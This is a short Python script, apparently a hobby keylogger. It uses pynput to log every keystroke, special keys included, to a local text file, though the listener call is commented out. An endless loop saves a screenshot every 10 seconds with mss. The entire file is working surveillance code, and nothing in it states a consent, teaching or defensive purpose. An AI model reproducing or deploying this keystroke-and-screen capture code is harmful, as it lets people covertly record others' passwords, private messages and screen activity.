from pynput import keyboard
import mss
import time
import os

log_file = "log_file.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            if key == keyboard.Key.ctrl_l:
                file.write(f" Left Ctrl ")
            elif key == keyboard.Key.ctrl_r:
                file.write(f" Right Ctrl ")
            elif key == keyboard.Key.alt_l:
                file.write(f" Left Alt ")
            elif key == keyboard.Key.alt_gr:
                file.write(f" Right Alt ")
            elif key == keyboard.Key.shift_l:
                file.write(f" Left Shift ")
            elif key == keyboard.Key.shift_r:
                file.write(f" Right Shift ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write(f" Backspace ")
            elif key == keyboard.Key.tab:
                file.write("    ")
            elif key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.delete:
                file.write(" Delete ")
            else:
                file.write(f" {key} ")


# with keyboard.Listener(on_press=on_press) as listner:
#     listner.join()

s_dir = "key_logger/screenshots"

os.makedirs(s_dir, exist_ok=True)

count = 1

with mss.mss() as screen_shot:
    while True:
        interval = 10
        s_shot_name = f"{s_dir}/screenshot{str(count)}.png"
        screen_shot.shot(output=s_shot_name)
        print(f"screen_shot {s_shot_name} captured and saved successfully.")
        count += 1
        time.sleep(interval)


